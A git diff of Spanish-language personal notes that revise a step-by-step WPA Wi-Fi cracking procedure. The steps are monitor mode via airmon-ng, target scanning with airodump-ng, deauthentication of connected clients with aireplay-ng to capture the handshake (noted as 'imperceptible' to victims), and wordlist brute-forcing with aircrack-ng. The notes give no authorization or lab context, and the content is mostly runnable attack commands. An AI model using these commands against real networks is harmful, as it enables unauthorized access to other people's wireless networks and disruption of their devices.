@@ -233,6 +233,23 @@ https://github.com/luisesp19/ap/raw/main/ca.zip
 
 # Crack
 
+Crear un "wordlist" de contraseñas
+
+```
+cd
+cd Desktop
+nano contrasenas.txt
+```
+
+```
+hola
+prueba
+perro
+gato
+core
+casa
+```
+
 Comprobar que el device ha sido detectado
 
 ```
@@ -245,32 +262,46 @@ sudo airmon-ng check kill
 sudo airmon-ng check
 ```
 
-Comprobar wlan0 se ha convertido en wlan0mon
+Poner el dispositivo en modo monitor y comprobar que ha cambiado de nombre a "wlan0mon"
 
 ```
 sudo airmon-ng start wlan0
 iwconfig
 ```
 
+Escanear las redes públicas para obtener el BSSID del punto de acceso y su canal
+
 ```
 sudo airodump-ng wlan0mon
-coger el bssid y el canal para hacerlo más especifico:
-cd
-cd Desktop
-sudo airodump-ng -c [canal del punto de acceso] -bssid [bssid del punto de acceso] -w objetivo wlan0mon
-(en STATION coger la mac address del dispositivo que está conectado al punto de acceso. Se crearan algunos archivos llamados objetivo, entre ellos un .cap)
-
-sudo aireplay-ng -0 5 -a [bssid del punto de acceso] -c [mac address del dispositivo que está conectado al punto de acceso] wlan0mon
-tiene que mostrar algunas lineas de "Sending" y en el airodump-ng mostrarse el "handshake"
-
-cd
-cd Desktop
-crear un contrasenas.txt con contraseñas (incluir la contraseña buena)
-sudo aircrack-ng -w contrasenas.txt [el archivo .cap]
-Se debe mostrar "KEY FOUND" y a continuación la contraseña
 ```
 
-# Enlaces
+Volver a correr el comando, esta vez especificando ambos y un nombre para el output (archivos de salida) que nos servirán más adelante
+
+```
+cd
+cd Desktop
+sudo airodump-ng -c [canal] --bssid [bssid] -w objetivo wlan0mon
+```
+
+En la parte inferior se muestran los dispositivos conectados al punto de acceso.
+
+En otra pestaña del terminal, lanzamos una desconexión de cualquiera de los dispositivos. Usar la columna STATION
+
+```
+sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan0mon
+```
+
+La desconexión del dispositivo es imperceptible y este se reconectará automáticamente pero habremos conseguido el "WPA handshake" (comprobarlo en la otra pestaña del terminal)
+
+Lanzar la fuerza bruta usando el "wordlist" de contraseñas y el ".cap" de los archivos de salida. Si la contraseña está en el wordlist se mostrará "KEY FOUND"
+
+```
+cd
+cd Desktop
+sudo aircrack-ng -w [contrasenas] [cap]
+```
+
+# Algunos enlaces
 
 ```
 https://blog.heckel.io/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/
